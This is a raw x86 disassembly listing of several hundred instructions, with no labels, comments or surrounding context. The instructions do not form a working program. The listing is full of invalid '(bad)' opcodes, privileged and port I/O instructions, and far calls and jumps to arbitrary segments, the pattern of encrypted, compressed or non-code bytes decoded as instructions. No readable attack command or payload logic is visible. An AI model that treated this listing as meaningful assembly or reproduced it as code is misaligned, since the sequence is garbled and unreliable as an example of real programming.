  404a0f:	sbb    al,0xc1
  404a11:	sar    DWORD PTR [ebx],1
  404a13:	test   BYTE PTR [ebp+0x1a],dl
  404a16:	hlt    
  404a17:	arpl   ax,sp
  404a19:	fldcw  WORD PTR [eax]
  404a1b:	and    DWORD PTR [ecx-0x4091b84c],edi
  404a21:	sub    dh,BYTE PTR [ebp-0x2c3cc83a]
  404a27:	aas    
  404a28:	rol    DWORD PTR [ecx-0x41],0x58
  404a2c:	out    0xd9,al
  404a2e:	xlat   BYTE PTR ds:[ebx]
  404a2f:	ins    DWORD PTR es:[edi],dx
  404a30:	enter  0x316,0x28
  404a34:	lock test al,0x79
  404a37:	mov    ch,0xa7
  404a39:	ins    BYTE PTR es:[edi],dx
  404a3a:	push   es
  404a3b:	(bad)  
  404a3c:	daa    
  404a3d:	lea    esp,[edi-0x73fee079]
  404a43:	out    dx,al
  404a44:	test   DWORD PTR [ebx-0x5d6e35bb],edx
  404a4a:	nop
  404a4b:	inc    esp
  404a4c:	fwait
  404a4d:	pop    es
  404a4e:	jp     0x404a9f
  404a50:	(bad)
  404a53:	test   BYTE PTR [ebx-0x5a],bl
  404a56:	rol    DWORD PTR [edx+0x3d5847bc],0x69
  404a5d:	mov    ebp,0x3b233ba8
  404a62:	dec    ebp
  404a63:	add    DWORD PTR [edi-0x7b],edx
  404a66:	or     dl,dl
  404a68:	out    dx,al
  404a69:	xchg   esi,eax
  404a6a:	iret   
  404a6b:	outs   dx,BYTE PTR ds:[esi]
  404a6c:	mul    BYTE PTR [ebx+ecx*4-0x46f06d5c]
  404a73:	cmp    BYTE PTR [edi],0xa
  404a76:	bound  esi,QWORD PTR [ebp-0x72]
  404a79:	(bad)  
  404a7a:	cli    
  404a7b:	jmp    0x404acf
  404a7d:	(bad)  
  404a7e:	stc    
  404a7f:	sbb    DWORD PTR [edi],ebp
  404a81:	pop    edi
  404a82:	jo     0x404a1a
  404a84:	inc    ebx
  404a85:	push   es
  404a86:	pop    esp
  404a87:	retf   
  404a88:	fisttp WORD PTR cs:[ebp-0x22]
  404a8c:	mov    ch,0x63
  404a8e:	fisttp WORD PTR [ebx-0x14]
  404a91:	je     0x404a94
  404a93:	sub    DWORD PTR [eax],edi
  404a95:	stc    
  404a96:	mov    al,0xa
  404a98:	leave  
  404a99:	xchg   edi,eax
  404a9a:	loop   0x404a38
  404a9c:	adc    eax,0x3041dcdb
  404aa1:	scas   eax,DWORD PTR es:[edi]
  404aa2:	in     eax,0xce
  404aa4:	inc    BYTE PTR [edx+0x5ea3a6bc]
  404aaa:	out    0x78,al
  404aac:	xor    ah,dl
  404aae:	(bad)  
  404aaf:	out    0x8b,al
  404ab1:	call   0x4d58:0x4e0ca8ca
  404ab8:	pop    esp
  404ab9:	inc    ecx
  404aba:	into   
  404abb:	adc    eax,0x80f4027a
  404ac0:	inc    DWORD PTR [edx-0x31]
  404ac3:	sar    DWORD PTR [ebx],1
  404ac5:	test   DWORD PTR [ebp+0x63],0x15a45777
  404acc:	ds mov dl,0xcb
  404acf:	lods   eax,DWORD PTR ds:[esi]
  404ad0:	or     dl,BYTE PTR [bp+di-0x5c]
  404ad4:	push   ebx
  404ad5:	jo     0x404afd
  404ad7:	and    al,0xd1
  404ad9:	or     DWORD PTR [edi-0x40],ebx
  404adc:	loop   0x404b22
  404ade:	cmp    ebx,DWORD PTR gs:[edx+edx*8+0x4]
  404ae3:	into   
  404ae4:	fistp  DWORD PTR [ecx]
  404ae6:	fisttp WORD PTR [ecx-0x69]
  404ae9:	pop    esp
  404aea:	lahf   
  404aeb:	and    ecx,esi
  404aed:	test   BYTE PTR [edi+0x48],bh
  404af0:	xchg   esp,eax
  404af1:	inc    esp
  404af2:	rol    BYTE PTR [edi-0x17],cl
  404af5:	test   al,0x66
  404af7:	ins    DWORD PTR es:[edi],dx
  404af8:	ficomp DWORD PTR [eax+0x76]
  404afb:	jg     0x404aa1
  404afd:	mov    dx,0xe5b3
  404b01:	jmp    0x404b5b
  404b03:	movd   DWORD PTR [ebx],mm7
  404b06:	push   0x44
  404b08:	fwait
  404b09:	bound  esi,QWORD PTR ds:0x90dfcbcf
  404b0f:	sti    
  404b10:	xor    bh,0x23
  404b13:	lea    ebp,[ecx-0xc192906]
  404b19:	outs   dx,BYTE PTR ds:[esi]
  404b1a:	cdq    
  404b1b:	mov    bl,0x4
  404b1d:	repnz push ecx
  404b1f:	rol    BYTE PTR [eax-0x77c2bb3b],cl
  404b25:	(bad)  
  404b26:	(bad)  
  404b28:	jnp    0x404b81
  404b2a:	cs mov bh,0xe3
  404b2d:	dec    ecx
  404b2e:	lods   al,BYTE PTR ds:[esi]
  404b2f:	pop    ds
  404b30:	adc    DWORD PTR es:[ebx+0xf3cf745],esi
  404b37:	adc    eax,0x39
  404b3a:	mov    esp,0x69492f64
  404b3f:	mov    bl,0x3
  404b41:	out    dx,al
  404b42:	sub    eax,0xf901816a
  404b47:	pop    esi
  404b48:	aaa    
  404b49:	dec    esi
  404b4a:	push   ss
  404b4b:	pushf  
  404b4c:	punpcklbw mm7,DWORD PTR [ebp-0x63]
  404b50:	sub    edi,DWORD PTR [ebx+0x13]
  404b53:	popa   
  404b54:	loopne 0x404aeb
  404b56:	pop    ebp
  404b57:	stos   BYTE PTR es:[edi],al
  404b58:	aam    0xda
  404b5a:	jmp    0x76b8ff4e
  404b5f:	inc    edi
  404b60:	cmp    ah,BYTE PTR [esi-0x57beca4e]
  404b66:	(bad)  
  404b67:	(bad)  [edi-0x4b032d90]
  404b6d:	xor    ecx,DWORD PTR [ebx+ebx*1+0x2b2f0a13]
  404b74:	call   0x459c:0x6b018d7e
  404b7b:	xchg   edx,eax
  404b7c:	popf   
  404b7d:	vpslld xmm5,xmm2,XMMWORD PTR [esi-0x660a14bb]
  404b85:	pop    eax
  404b86:	and    edi,DWORD PTR [edi-0x58]
  404b89:	xlat   BYTE PTR ds:[ebx]
  404b8a:	lea    edi,[esi]
  404b8c:	and    eax,DWORD PTR [ebx-0x67e76ba8]
  404b92:	fdiv   QWORD PTR [esi+eiz*4-0x3ede06e2]
  404b99:	enter  0x9b20,0x5e
  404b9d:	outs   dx,DWORD PTR ds:[esi]
  404b9e:	stc    
  404b9f:	pop    ebx
  404ba0:	fcom   QWORD PTR [ecx-0x7597f132]
  404ba6:	mov    bh,0x74
  404ba8:	mov    bl,0x8c
  404baa:	fs or  eax,0xdac7e3bd
  404bb0:	fnsave [ecx-0x18]
  404bb3:	or     BYTE PTR [edx+0x1c],al
  404bb6:	mov    edx,0xb478771f
  404bbb:	mov    ebp,0x296cc04
  404bc0:	mov    bl,0xa
  404bc2:	aas    
  404bc3:	das    
  404bc4:	hlt    
  404bc5:	neg    BYTE PTR [edi-0x79]
  404bc8:	mov    WORD PTR [edx+0x479469f2],fs
  404bce:	sub    BYTE PTR [esp+edi*2],dl
  404bd1:	and    bl,BYTE PTR [eax-0x13]
  404bd4:	inc    edi
  404bd5:	and    al,0xfe
  404bd7:	push   edx
  404bd8:	cmp    eax,0xa382d1d5
  404bdd:	loopne 0x404c59
  404bdf:	enter  0x82fb,0xa5
  404be3:	xchg   esi,eax
  404be4:	push   edx
  404be5:	pop    ebp
  404be6:	add    ebx,DWORD PTR [ecx+0x4ba52940]
  404bec:	mov    ah,BYTE PTR [ebx+0x15]
  404bef:	out    0x4a,al
  404bf1:	sahf   
  404bf2:	hlt    
  404bf3:	stc    
  404bf4:	mov    ah,0x6a
  404bf6:	ffree  st(2)
  404bf8:	call   0xc80b:0xe29918b0
  404bff:	repz pop esi
  404c01:	push   ecx
  404c02:	aas    
  404c03:	and    al,0x14
  404c05:	(bad)  
  404c06:	enter  0x2fb4,0x37
  404c0a:	dec    edx
  404c0b:	pop    eax
  404c0c:	mov    esi,0xcf7eeaf8
  404c11:	sahf   
  404c12:	xor    eax,0x138b5f23
  404c17:	ret    0x8676
  404c1a:	sub    eax,0x6edba60f
  404c1f:	mov    eax,0xd037bcaa
  404c24:	fldln2 
  404c26:	sub    DWORD PTR [ebx-0x73],edx
  404c29:	rcr    DWORD PTR [edx-0x5dacdb03],cl
  404c2f:	adc    DWORD PTR [esi],0xc60f415c
  404c35:	or     edi,DWORD PTR [eax]
  404c37:	in     al,dx
  404c38:	ret    
  404c39:	arpl   WORD PTR [esi-0x35],cx
  404c3c:	and    ch,BYTE PTR [esi]
  404c3e:	lods   al,BYTE PTR ds:[esi]
  404c3f:	pop    ss
  404c40:	mov    edx,0xc0ef8afe
  404c45:	les    esp,FWORD PTR [ebp-0x4b30dde0]
  404c4b:	dec    ebx
  404c4c:	add    esp,edx
  404c4e:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404c50:	mov    ds:0xb21ca4b,al
  404c55:	inc    esi
  404c56:	xor    ebp,ebp
  404c58:	adc    eax,0xa010196
  404c5d:	call   0x9a965806
  404c62:	inc    edx
  404c63:	adc    eax,0x14287ff1
  404c68:	or     ebx,DWORD PTR [ecx-0x32f2dbc4]
  404c6e:	aas    
  404c6f:	out    0xd3,al
  404c71:	shl    ebx,cl
  404c73:	stos   BYTE PTR es:[edi],al
  404c74:	mov    BYTE PTR [edi-0x5c],ah
  404c77:	(bad)  
  404c78:	call   0x5853f38b
  404c7d:	pushf  
  404c7e:	inc    eax
  404c7f:	mov    ebp,0x3253dacc
  404c84:	fwait
  404c85:	push   ds
  404c86:	outs   dx,DWORD PTR ds:[esi]
  404c87:	sub    dl,0xb8
  404c8a:	pop    edi
  404c8b:	sub    BYTE PTR [eax-0x7411f962],ch
  404c91:	daa    
  404c92:	push   ebx
  404c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c94:	aad    0x2f
  404c96:	rol    ebx,cl
  404c98:	mov    cl,0xc0
  404c9a:	es push esi
  404c9c:	or     dl,BYTE PTR [edx+edi*8]
  404c9f:	xchg   ebx,eax
  404ca0:	retf   
  404ca1:	push   esp
  404ca2:	cs jle 0x404cf3
  404ca5:	push   edi
  404ca6:	add    esp,DWORD PTR [edi+0x21]
  404ca9:	mov    ah,0x21
  404cab:	push   ecx
  404cac:	in     eax,dx
  404cad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cae:	pop    ebp
  404caf:	repz push 0xffffffa0
  404cb2:	adc    ecx,edx
  404cb4:	fcomp  QWORD PTR [edx-0x65]
  404cb7:	ja     0x404c80
  404cb9:	stc    
  404cba:	repnz sub eax,0x219372f9
  404cc0:	test   cl,0xd8
  404cc3:	out    dx,al
  404cc4:	jp     0x404d31
  404cc6:	int3   
  404cc7:	test   DWORD PTR [ebp+0x29c404c9],0xe5d17b15
  404cd1:	retf   
  404cd2:	mov    WORD PTR ds:0xb7615643,?
  404cd8:	imul   esp,DWORD PTR [eax-0x2225021],0xfffffff1
  404cdf:	push   edx
  404ce0:	adc    eax,0x1773f209
  404ce5:	push   edi
  404ce6:	jae    0x404cf7
  404ce8:	add    ecx,DWORD PTR [edx+0x7a]
  404ceb:	xor    esp,ecx
  404ced:	lock into 
  404cef:	jg     0x404cf6
  404cf1:	fsubrp st(1),st
  404cf3:	pop    ds
  404cf4:	push   ecx
  404cf5:	dec    ecx
  404cf6:	adc    eax,DWORD PTR ds:[esi+0x5fb352ab]
  404cfd:	cdq    
  404cfe:	adc    DWORD PTR [edi-0x4505bf6f],esi
  404d04:	and    eax,0xa72ac756
  404d09:	nop
  404d0a:	and    al,0x54
  404d0c:	pop    esp
  404d0d:	xlat   BYTE PTR ds:[ebx]
  404d0e:	cmc    
  404d0f:	shl    DWORD PTR [esi+0x528f501],cl
  404d15:	mov    esp,esp
  404d17:	nop
  404d18:	stos   BYTE PTR es:[edi],al
  404d19:	pop    eax
  404d1a:	inc    ecx
  404d1b:	sbb    bl,BYTE PTR [ebx]
  404d1d:	dec    eax
  404d1e:	ror    al,0x2c
  404d21:	mov    dh,0xd9
  404d23:	jg     0x404d20
  404d25:	fucomp st(7)
  404d27:	popf   
  404d28:	jbe    0x404da9
  404d2a:	cld    
  404d2b:	mov    edi,0x21dbb2b6
  404d30:	inc    ebx
  404d31:	call   0x9741:0x269c924a
  404d38:	int    0x21
  404d3a:	jp     0x404ce7
  404d3c:	sub    BYTE PTR ss:[ebp+0x7],0xe0
  404d41:	test   BYTE PTR [ebx],cl
  404d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d44:	into   
  404d45:	(bad)  
  404d47:	into   
  404d48:	ds jae 0x404d18
  404d4b:	add    DWORD PTR [ebx+0x3a],esp
  404d4e:	xor    bl,BYTE PTR [ebp+0x570d3330]
  404d54:	xchg   cl,dl
  404d56:	mov    DWORD PTR [ebx+0x48],ebp
  404d59:	inc    esi
  404d5a:	xchg   ecx,eax
  404d5b:	and    dh,0x3b
  404d5e:	test   al,0x14
  404d60:	sub    eax,0x5deeaeec
  404d65:	jle    0x404d4e
  404d67:	enter  0x479a,0x42
  404d6b:	xor    al,0xa9
  404d6d:	je     0x404cfc
  404d6f:	loopne 0x404de0
  404d71:	ins    DWORD PTR es:[edi],dx
  404d72:	out    dx,eax
  404d73:	in     al,0x3f
  404d75:	inc    ecx
  404d76:	int3   
  404d77:	(bad)  
  404d79:	ror    DWORD PTR [ecx],1
  404d7b:	icebp  
  404d7c:	aaa    
  404d7d:	or     al,0xe7
  404d7f:	inc    DWORD PTR [edi-0x58a049de]
  404d85:	(bad)  
  404d86:	xor    eax,ebx
  404d88:	xchg   bl,al
  404d8a:	jle    0x404d6b
  404d8c:	jbe    0x404df3
  404d8e:	cmp    dl,cl
  404d90:	inc    DWORD PTR [esi]
  404d92:	pop    ecx
  404d93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d94:	ins    DWORD PTR es:[edi],dx
  404d95:	mov    ds:0xae458161,al
  404d9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404d9b:	out    dx,eax
  404d9c:	or     al,0x8b
  404d9e:	inc    edx
  404d9f:	add    al,0x64
  404da1:	fild   DWORD PTR [eax]
  404da3:	cmp    bl,bh
  404da5:	xchg   edi,eax
  404da6:	pusha  
  404da7:	and    DWORD PTR [edi+ecx*1],edi
  404daa:	repz push ds
  404dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404dad:	jno    0x404e26
  404daf:	pop    edi
  404db0:	pop    edx
  404db1:	cmp    eax,0x21065d5c
  404db6:	jecxz  0x404e37
  404db8:	daa    
  404db9:	fstp   DWORD PTR [eax]
  404dbb:	bnd jo 0x404dd3
  404dbe:	test   eax,0x26f873e2
  404dc3:	aam    0x5
  404dc5:	jmp    0x5f2bded3
  404dca:	adc    cl,ah
  404dcc:	stos   DWORD PTR es:[edi],eax
  404dcd:	and    ecx,DWORD PTR [edi+ecx*4]
  404dd0:	and    DWORD PTR [ebx-0x30db12fa],esp
  404dd6:	or     ebx,DWORD PTR [esi]
  404dd8:	mov    dl,0xe4
  404dda:	loope  0x404d67
  404ddc:	cld    
  404ddd:	clc    
  404dde:	add    al,0xa7
  404de0:	add    eax,0x195d5c47
  404de5:	xor    al,0xa
  404de8:	imul   DWORD PTR [esi+0x39]
  404deb:	loope  0x404df7
  404ded:	and    DWORD PTR [edi-0x1248c6e5],esi
  404df3:	call   0xd3e739de
  404df8:	sbb    BYTE PTR [eax+0x4edad064],ah
  404dfe:	adc    BYTE PTR [eax],dh
  404e00:	loopne 0x404e7c
  404e02:	shl    BYTE PTR [edi-0x73],1
  404e05:	dec    edx
  404e06:	dec    edx
  404e07:	popf   
  404e08:	push   edi
  404e09:	lods   al,BYTE PTR ds:[esi]
  404e0a:	xchg   esi,eax
  404e0b:	xchg   edx,eax
  404e0c:	mov    edi,0x88d8faf6
  404e11:	ins    BYTE PTR es:[edi],dx
  404e12:	add    eax,0xa38cf8dd
  404e17:	ret    
  404e18:	enter  0xb3ea,0x4f
  404e1c:	lock shl BYTE PTR [ebx],1
  404e1f:	pop    edx
  404e20:	repz mov eax,ds:0xedf1320e
  404e26:	adc    bl,BYTE PTR [ebx+0x447529f9]
  404e2c:	gs (bad) 
  404e2e:	push   esi
  404e2f:	xchg   DWORD PTR [eax],ebp
  404e31:	pextrw ebx,mm2,0xf7
  404e35:	or     ah,BYTE PTR [eax+0xfa3b15d]
  404e3b:	mov    esi,0xeae47d9a
  404e40:	call   0x81357f3d
  404e45:	mov    bl,0xbd
  404e47:	dec    esi
  404e48:	mov    ch,0x4e
  404e4a:	loop   0x404ead
  404e4c:	xor    bl,BYTE PTR [edx+0x25c149fa]
  404e52:	sbb    eax,0xa4f215e0
  404e57:	push   ebp
  404e58:	sub    DWORD PTR [ecx],eax
  404e5a:	add    ch,bl
  404e5c:	rol    bh,1
  404e5e:	popf   
  404e5f:	push   ebx
  404e60:	inc    esi
  404e61:	scas   eax,DWORD PTR es:[edi]
  404e62:	mov    bh,ah
  404e64:	js     0x404df7
  404e66:	jb     0x404eba
  404e68:	jmp    0x9fef:0x3cd106a2
  404e6f:	jl     0x404e97
  404e71:	xor    eax,0xa94cbec
  404e76:	sub    ecx,DWORD PTR [eax+0xb]
  404e79:	into   
  404e7a:	enter  0x62dc,0x20
  404e7e:	pop    ss
  404e7f:	fcom   QWORD PTR [edx-0x2c]
  404e82:	or     eax,0xf83239d4
  404e87:	jnp    0x404e7e
  404e89:	(bad)  
  404e8a:	dec    ebp
  404e8b:	adc    al,0x27
  404e8d:	fild   DWORD PTR [eax]
  404e8f:	xor    DWORD PTR [eiz*8-0x4a74be3d],esp
  404e96:	adc    BYTE PTR [edx-0x4f],cl
  404e99:	mov    al,0x3e
  404e9b:	inc    ecx
  404e9c:	cmp    BYTE PTR [ebp+0x1f61040c],cl
  404ea2:	addr16 aaa 
  404ea4:	(bad)  
  404ea5:	ins    BYTE PTR es:[edi],dx
  404ea6:	pop    edi
  404ea7:	popa   
  404ea8:	jl     0x404e57
  404eaa:	jb     0x404e5a
  404eac:	or     al,0xa5
  404eae:	push   ebx
  404eaf:	lds    edx,FWORD PTR [esi]
  404eb1:	test   al,0x45
  404eb3:	bound  esi,QWORD PTR [eax-0x57]
  404eb6:	in     eax,0xc5
  404eb8:	sbb    DWORD PTR [edi-0x11171750],ebp
  404ebe:	cmc    
  404ebf:	std    
  404ec0:	pushf  
  404ec1:	and    eax,DWORD PTR ds:0x2cc6eefe
  404ec7:	cmp    edi,DWORD PTR [esi-0x60ad67b8]
  404ecd:	push   es
  404ece:	add    cl,BYTE PTR ds:0xd08f7a32
  404ed4:	mov    ah,BYTE PTR ds:0x6e75ad41
  404eda:	fsubp  st(7),st
  404edc:	jmp    0x30d3b5b7
  404ee1:	aas    
  404ee2:	in     al,dx
  404ee3:	leave  
  404ee4:	pop    ebx
  404ee5:	and    eax,0xc905da9a
  404eea:	jle    0x404efe
  404eec:	mov    edx,0xd1ce8d8e
  404ef1:	adc    DWORD PTR [esi-0x4f8735dc],ecx
  404ef7:	(bad)  
  404ef8:	es cwde 
  404efa:	or     DWORD PTR [esi-0x3717e458],eax
  404f00:	arpl   WORD PTR [edi-0x2f],cx
  404f03:	js     0x404ed9
  404f05:	iret   
  404f06:	jp     0x404f50
  404f08:	jl     0x404f6b
  404f0a:	out    0xde,eax
  404f0c:	or     eax,DWORD PTR [edi]
  404f0e:	imul   esp
  404f10:	aas    
  404f11:	jmp    0x1797:0x638202eb
  404f18:	bound  esi,QWORD PTR [edi+eiz*8-0x56]
  404f1c:	(bad)  
  404f1d:	xchg   ecx,eax
  404f1e:	loopne 0x404ee4
  404f20:	out    dx,al
  404f21:	mov    WORD PTR [ebx-0x6e853bf6],gs
  404f27:	xchg   ah,cl
  404f29:	xor    ebp,DWORD PTR [edx]
  404f2b:	mov    bl,0xbb
  404f2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404f2e:	push   esi
  404f2f:	sub    esp,ebp
  404f31:	pop    ss
  404f32:	cmp    BYTE PTR [esi],0x7a
  404f35:	mov    ecx,0xfe1780d
  404f3a:	mov    bl,BYTE PTR [eax]
  404f3c:	jbe    0x404fa2
  404f3e:	push   ebp
  404f3f:	push   ebx
  404f40:	inc    ebp
  404f41:	repz sub al,0x34
  404f44:	cmp    DWORD PTR [ecx-0x75f35176],ecx
  404f4a:	adc    eax,0x88cf9055
  404f4f:	mov    ebp,0xf7dea991
  404f54:	shr    BYTE PTR [edi],1
  404f56:	mov    dl,0x6f
  404f58:	gs ret 0xdbad
  404f5c:	add    ebp,DWORD PTR [esp+ecx*1-0x6ea4e4d9]
  404f63:	pusha  
  404f64:	xchg   BYTE PTR [esi],ch
  404f66:	fisub  DWORD PTR [ecx-0x280c381f]
  404f6c:	mov    WORD PTR [edi+esi*4+0x2b9f18d3],cs
  404f73:	mov    edi,0xdf92291a
  404f78:	add    dh,BYTE PTR [eax+ebp*4+0xad77c62]
  404f7f:	push   es
  404f80:	sbb    DWORD PTR [edx-0x7b5c050b],eax
  404f86:	(bad)  
  404f87:	add    DWORD PTR [ecx+ecx*1-0x14],0xecd00c73
  404f8f:	aad    0x97
  404f91:	sub    al,0xed
  404f93:	dec    eax
  404f94:	jmp    0xebec:0xb8f1f96b
  404f9b:	loop   0x404f98
  404f9d:	pop    edi
  404f9e:	mov    WORD PTR [edi],ds
  404fa0:	xchg   edx,eax
  404fa1:	cmc    
  404fa2:	inc    ebx
  404fa3:	cmp    dl,bl
  404fa5:	cmp    eax,DWORD PTR [ecx-0x30604971]
  404fab:	loop   0x404f81
  404fad:	aam    0x8d
  404faf:	fstp   st(4)
  404fb1:	jle    0x404fb1
  404fb3:	mov    ecx,0x23fed4ad
  404fb8:	cwde   
  404fb9:	cmc    
  404fba:	shr    DWORD PTR [edx],0xfe
  404fbd:	pushf  
  404fbe:	mov    ch,0xce
  404fc0:	scas   al,BYTE PTR es:[edi]
  404fc1:	adc    al,0x8b
  404fc3:	stc    
  404fc4:	mov    es,WORD PTR ss:[ecx-0x24]
  404fc8:	jo     0x404f69
  404fca:	jge    0x404f77
  404fcc:	outs   dx,BYTE PTR ds:[esi]
  404fcd:	sbb    dl,BYTE PTR [ecx+eax*2-0x33]
  404fd1:	cmp    DWORD PTR [ebp-0x7395b8d1],0xfffffffc
  404fd8:	or     BYTE PTR [ebx-0x1b],dh
  404fdb:	dec    esp
  404fdc:	inc    ecx
  404fdd:	push   ds
  404fde:	adc    ecx,DWORD PTR [eax]
  404fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404fe1:	mov    ecx,0x862ccad6
  404fe6:	js     0x40503c
  404fe8:	and    esi,eax
  404fea:	sub    cl,ah
  404fec:	ss retf 
  404fee:	stos   BYTE PTR es:[edi],al
  404fef:	cld    
  404ff0:	push   ds
  404ff1:	push   ds
  404ff2:	mov    al,0x52
  404ff4:	enter  0xad6e,0xa
  404ff8:	jb     0x40502c
  404ffa:	retf   
  404ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ffc:	test   BYTE PTR [eax+ebx*8+0x54915b7c],bh
  405003:	inc    ebx
  405004:	adc    ah,dl
  405006:	xchg   ebx,eax
  405007:	cmp    ecx,DWORD PTR [eax+eax*2+0x4664b72c]
  40500e:	cld    
  40500f:	and    BYTE PTR [esi+esi*2-0x5e9c80ff],al
  405016:	and    BYTE PTR [ecx+0x62000f37],0xd6
  40501d:	mov    ebp,0x6d08f9c9
  405022:	stos   BYTE PTR es:[edi],al
  405023:	out    dx,eax
  405024:	and    al,0x29
  405026:	repnz outs dx,DWORD PTR ds:[esi]
  405028:	or     al,0xa6
  40502a:	call   0x2e62049f
  40502f:	and    BYTE PTR [ecx],dh
  405031:	je     0x405040
  405033:	xchg   DWORD PTR ds:0x6265d018,edi
  405039:	cmp    al,0xa4
  40503b:	and    DWORD PTR [edx-0x7374c1a2],0xffffffe3
  405042:	call   0x96ec:0xc6f3c435
  405049:	(bad)  
  40504a:	ins    BYTE PTR es:[edi],dx
  40504b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40504c:	imul   edi,DWORD PTR [esp+ebx*2-0x3f],0x23
  405051:	and    bh,BYTE PTR [ebx+ecx*1]
  405054:	cmc    
  405055:	xor    DWORD PTR ds:0x4610f479,eax
  40505b:	pop    es
  40505c:	lahf   
  40505d:	cdq    
  40505e:	nop
  40505f:	stos   DWORD PTR es:[edi],eax
  405060:	xchg   BYTE PTR [esi+0x59],cl
  405063:	shr    BYTE PTR [esi-0x40929029],1
  405069:	(bad)  
  40506a:	aad    0x0
  40506c:	jne    0x4050e6
  40506e:	ds adc eax,0xc64e2559
  405074:	dec    ebx
  405075:	add    eax,0xc6d9975d
  40507a:	mov    al,ds:0xadc0f44
  40507f:	out    0xce,eax
  405081:	(bad)  
  405082:	push   eax
  405083:	sti    
  405084:	leave  
  405085:	int3   
  405086:	bound  edx,QWORD PTR [edx+0x28]
  405089:	jbe    0x405089
  40508b:	inc    edx
  40508c:	add    ebx,DWORD PTR [ecx]
  40508e:	xor    ebp,DWORD PTR gs:[esi+0x45]
  405092:	ins    DWORD PTR es:[edi],dx
  405093:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405094:	rcl    DWORD PTR [eax],cl
  405096:	jecxz  0x40501f
  405098:	mov    ch,ah
  40509a:	cmp    eax,0x8b3368d8
  40509f:	adc    DWORD PTR [esi+0x42],ebp
  4050a2:	lds    ebx,FWORD PTR [ebp+0x38a33a72]
  4050a8:	addr16 loopne 0x405092
  4050ab:	cdq    
  4050ac:	push   ebp
  4050ad:	xchg   ebx,eax
  4050ae:	shr    BYTE PTR [ecx+0x56],1
  4050b1:	mov    esi,0x75ec3f81
  4050b6:	paddd  mm1,QWORD PTR [ebx]
  4050b9:	dec    ebx
  4050ba:	jmp    0xc02e:0x2764873a
  4050c1:	sbb    ch,dh
  4050c3:	jp     0x40505a
  4050c5:	push   edi
  4050c6:	cmp    ebp,edx
  4050c8:	mov    edi,0x526be36f
  4050cd:	xlat   BYTE PTR ds:[ebx]
  4050ce:	mov    bl,0xdf
  4050d0:	mov    esp,edx
  4050d2:	(bad)  
  4050d3:	sub    eax,DWORD PTR [edi]
  4050d5:	fdiv   st,st(0)
  4050d7:	leave  
  4050d8:	test   eax,0xf5db44fa
  4050dd:	ins    BYTE PTR es:[edi],dx
  4050de:	and    bl,BYTE PTR [ebp+edx*2-0x76c0c71e]
  4050e5:	pop    edx
  4050e6:	repz in eax,0x84
  4050e9:	lea    eax,[ebx+ecx*2]
  4050ec:	push   ecx
  4050ed:	sub    bl,BYTE PTR [eax]
  4050ef:	aas    
  4050f0:	not    DWORD PTR [esi]
  4050f2:	(bad)  
  4050f4:	lock push ecx
  4050f6:	iret   
  4050f7:	xor    BYTE PTR [esi],dh
  4050f9:	xchg   ecx,eax
  4050fa:	rcr    DWORD PTR [ecx-0x68],1
  4050fd:	sbb    DWORD PTR es:[esi-0x2f7805d9],edx
  405104:	xchg   edi,eax
  405105:	fcomp  QWORD PTR [ebx+0x60]
  405108:	push   ebx
  405109:	out    0x95,eax
  40510b:	rcr    BYTE PTR [edi],cl
  40510d:	fistp  WORD PTR [edx+0x1fd35766]
  405113:	test   bh,dh
  405115:	loop   0x4050f1
  405117:	push   0xffffff87
  405119:	fucomp st(6)
  40511b:	mov    dl,0x83
  40511d:	ret    0xa27d
  405120:	retf   0x652e
  405123:	lea    edx,[eax]
  405125:	add    al,0xba
  405127:	xchg   edx,eax
  405128:	mov    eax,ds:0x1ada5bf
  40512d:	jg     0x405177
  40512f:	nop
  405130:	ss popf 
  405132:	jae    0x405145
  405134:	inc    ebp
  405135:	and    edi,esp
  405137:	push   0xffffffb3
  405139:	mov    dh,bl
  40513b:	pop    gs
  40513d:	jp     0x405100
  40513f:	lock mov bl,0x31
  405142:	sbb    al,0x9d
  405144:	loop   0x4050d4
  405146:	popa   
  405147:	aaa    
  405148:	retf   0x43b2
  40514b:	addr16 pop edi
  40514d:	jle    0x4050eb
  40514f:	mov    cl,0x57
  405151:	(bad)  
  405152:	stc    
  405153:	stos   DWORD PTR es:[edi],eax
  405154:	jbe    0x405133
  405156:	inc    ecx
  405157:	or     BYTE PTR [esp+ebp*4+0x69],0x2b
  40515c:	push   ebp
  40515d:	pop    edx
  40515e:	das    
  40515f:	js     0x40518a
  405161:	sub    ecx,ebp
  405163:	outs   dx,DWORD PTR ds:[esi]
  405164:	fs je  0x405122
  405167:	push   ds
  405168:	pushf  
  405169:	cld    
  40516a:	test   ah,0x60
  40516d:	sbb    dl,bl
  40516f:	pop    ebx
  405170:	jo     0x40518d
  405172:	aam    0xdb
  405174:	pop    esp
  405175:	test   al,0x35
  405177:	cli    
  405178:	stos   BYTE PTR es:[edi],al
  405179:	clc    
  40517a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40517b:	outs   dx,DWORD PTR ds:[esi]
  40517c:	call   0x51d6a107
  405181:	sbb    ch,cl
  405183:	mov    eax,ds:0xabe6da8b
  405188:	stos   BYTE PTR es:[edi],al
  405189:	in     al,0x53
  40518b:	mov    eax,DWORD PTR [eax-0x7e44bd96]
  405191:	sbb    eax,DWORD PTR [edx+0x69]
  405194:	test   BYTE PTR ds:0xe344ca97,ah
  40519a:	int    0x93
  40519c:	repz sub DWORD PTR [esi],ebp
  40519f:	popa   
  4051a0:	lods   al,BYTE PTR ds:[esi]
  4051a1:	jnp    0x40518a
  4051a3:	je     0x4051b8
  4051a5:	repnz aas 
  4051a7:	iret   
  4051a8:	int3   
  4051a9:	nop
  4051aa:	pop    edi
  4051ab:	(bad)  
  4051ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4051ad:	(bad)  
  4051ae:	push   esi
  4051af:	es in  al,dx
  4051b1:	xchg   ebx,eax
  4051b2:	int3   
  4051b3:	sbb    bh,BYTE PTR [edx-0x310888b3]
